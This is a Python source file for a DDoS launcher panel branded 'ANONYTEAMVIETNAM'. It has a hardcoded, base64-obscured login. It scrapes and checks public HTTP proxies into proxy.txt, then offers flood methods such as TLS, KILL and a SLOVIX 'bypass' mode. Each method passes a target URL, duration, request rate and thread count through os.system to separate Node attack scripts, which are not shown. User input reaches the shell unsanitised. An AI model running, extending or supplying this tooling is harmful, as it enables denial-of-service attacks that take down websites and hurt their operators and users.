import base64
from colorama import Fore,init
import os
from getpass import getpass
import time
init()
BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m' # orange on some systems
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
LIGHT_GRAY = '\033[37m'
DARK_GRAY = '\033[90m'
BRIGHT_RED = '\033[91m'
BRIGHT_GREEN = '\033[92m'
BRIGHT_YELLOW = '\033[93m'
BRIGHT_BLUE = '\033[94m'
BRIGHT_MAGENTA = '\033[95m'
BRIGHT_CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m' # called to return to standard terminal text color
os.system("cls" if os.name == "nt" else "clear")
u=base64.b64decode('YWRtaW4=').decode("utf-8")
p=base64.b64decode('YmFvQC4=').decode("utf-8")
def main():
    print(BLUE+''' )    (( (   ( .  (   ((    ((   (        (  (     ( (  
(()  (\())\: )\ . )\  ))\   ))\ ())       )\ )\   )\))\ 
()(_)))(_)(_)((_) ((_)((_)))((_)((_))     ((_)(_)__(_)(_)
|   \| __|  \/  |/ _ \| \| |_ _|/ __|    / __| |/ / \ / /
| |) | _|| |\/| | (_) | .  || || (__     \__ \   < \   / 
|___/|___|_|  |_|\___/|_|\_|___|\___|    |___/_|\_\ |_|
          '''+RESET)
    print(RED+'METHODS:TLS')
    print('        MIX')
    print('        GOJO')
    print('        GORI')
    print('        KILL')
    print('        SLOVIX')
    print('        FAST')
    print('        TLSX')
    print('        HTTP-RAW')

def attack(mt):
    if mt=='TLS' or mt=='tls':
            #USE:node tls.js url time rps threads proxy list
            url=input('URL:')
            time=int(input('TIME:'))
            rps=int(input('REQUEST PER SECOND:'))
            thr=int(input('THREADS:'))
            os.system(f'node StarsXTls2.js {url} {time} {rps} {thr} proxy.txt')
    if mt=='MIX' or mt=='mix':
            #USE:node mix.js url time rps threads proxy list
            url=input('URL:')
            time=int(input('TIME:'))
            rps=int(input('REQUEST PER SECOND:'))
            thr=int(input('THREADS:'))
            os.system(f'node mix.js {url} {time} {rps} {thr} proxy.txt')
    if mt=='GOJO' or mt=='gojo':
            #USE:node gojo.js <target> <time> <rps> <threads> <proxy file>
            url=input('URL:')
            time=int(input('TIME:'))
            rps=int(input('REQUEST PER SECOND:'))
            thr=int(input('THREADS:'))
            os.system(f'node gojo.js {url} {time} {rps} {thr} proxy.txt')    
    if mt=='GORI' or mt=='gori':
            #USE:node browser.js <target> <time> <threads> <ratelimit> <proxyfile>
            url=input('URL:')
            time=int(input('TIME:'))
            rps=int(input('REQUEST PER SECOND:'))
            thr=int(input('THREADS:'))
            os.system(f'node gori.js {url} {time} {thr} {rps} proxy.txt')
    if mt=='KILL' or mt=='kill':
            #USE:node browser.js <target> <time> <threads> <ratelimit> <proxyfile>
            url=input('URL:')
            time=int(input('TIME:'))
            rps=int(input('REQUEST PER SECOND:'))
            thr=int(input('THREADS:'))
            os.system(f'node kill.js {url} {time} {rps} {thr} proxy.txt')
    if mt=='SLOVIX' or mt=='slovix':
            #Usage: host time req thread proxy.txt flood/bypass
            url=input('URL:')
            time=int(input('TIME:'))
            rps=int(input('REQUEST PER SECOND:'))
            thr=int(input('THREADS:'))
            fb=('FLOOD','BYPASS','flood','bypass')
            b=input('FLOOD OR BYPASS:')
            if b in fb or b=='':
                x=b.lower()
                os.system(f'node slovix.js {url} {time} {rps} {thr} proxy.txt {x}')
            else:
                print('FLOOD OR BYPASS NOT',b)
    if mt=='FAST' or mt=='fast':
            url=input('URL:')
            os.system(f'node fast.js {url}')
    if mt=='TLSX' or mt=='tlsx':
            #Usage: target time rate thread proxyfile
            url=input('URL:')
            time=int(input('TIME:'))
            rps=int(input('REQUEST PER SECOND:'))
            thr=int(input('THREADS:'))
            os.system(f'node tlsx.js {url} {time} {rps} {thr} proxy.txt')
    if mt=='HTTP-RAW' or mt=='http-raw':
            #node HTTP-RAW.js url time
            url=input('URL:')
            time=int(input('TIME:'))
            os.system('node http-raw.js')
            os.system(f'node http-raw.js {url} {time}')
    
def methods():
    methods='TLS','MIX','GOJO','GORI','KILL',"SLOVIX",'FAST','TLSX','HTTP-RAW','tls','mix','gojo','gori','kill','slovix','fast','tlsx','http-raw'
    kt=False
    while kt==False:
        mt=input('METHOD:')
        if mt in methods:
            kt=True
            attack(mt)
        else:
            print(Fore.RED+'WRONG METHOD')
            time.sleep(1)
def run():
    import requests
    import threading
    import re
    import os

    URL = "http://httpbin.org/ip"
    PROXY_LIST_URLS = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=https&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/themiralay/Proxy-List-World/master/data.txt",
        "https://raw.githubusercontent.com/casals-ar/proxy-list/main/http",
        "https://raw.githubusercontent.com/casals-ar/proxy-list/main/https",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
        "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/http/global/http_checked.txt",
        "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt"
    ]

    proxy_lock = threading.Lock()
    proxy_count = [0]
    all_proxies = []

    def get_proxies(url, timeout=5):
        try:
            headers = {'User-Agent': 'Mozilla/5.0'}
            response = requests.get(url, headers=headers, timeout=timeout)
            response.raise_for_status()
            return response.text.splitlines()
        except:
            return []

    def scrape_worker(url):
        proxies = get_proxies(url)
        for proxy in proxies:
            with proxy_lock:
                all_proxies.append(proxy)
                proxy_count[0] += 1
                print(f"Proxy getting: {proxy_count[0]}", end='\r', flush=True)

    threads = [threading.Thread(target=scrape_worker, args=(url,)) for url in PROXY_LIST_URLS]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    all_proxies_set = list(set(all_proxies))

    def is_valid_format(proxy):
        return re.match(r"\d+\.\d+\.\d+\.\d+:\d+", proxy)

    valid_proxies = []

    def check_proxy(proxy):
        try:
            if is_valid_format(proxy):
                r = requests.get(URL, proxies={"http": proxy, "https": proxy}, timeout=10)
                if r.status_code == 200:
                    with proxy_lock:
                        valid_proxies.append(proxy)
        except:
            pass

    check_threads = [threading.Thread(target=check_proxy, args=(p,)) for p in all_proxies_set]
    for t in check_threads:
        t.start()
    for t in check_threads:
        t.join()

    # Đảm bảo file proxy.txt tồn tại rồi xóa nội dung (truncate)
    if not os.path.exists("proxy.txt"):
        open("proxy.txt", "w").close()
    else:
        with open("proxy.txt", "w", encoding="utf-8") as f:
            f.truncate(0)

    # Ghi lại proxies hợp lệ
    with open("proxy.txt", "w", encoding="utf-8") as f:
        for proxy in valid_proxies:
            f.write(proxy + "\n")

ktra=False
while ktra==False:
    print(GREEN+'WELCOME TO ANONYTEAMVIETNAM')
    u1=input('USER:')
    p1=getpass('PASSWORD:')
    if p1==p and u1==u:
        ktra=True
        print(GREEN+'PASSWORD CORRECT')
        time.sleep(1)
        os.system("cls" if os.name == "nt" else "clear")
        run()
        os.system("cls" if os.name == "nt" else "clear")
        main()
        methods()
    else:
        print(Fore.RED+'YOUR USER OR PASSWORD IS INCORRECT,PLEASE TRY AGAIN')
        time.sleep(1)
        os.system("cls" if os.name == "nt" else "clear")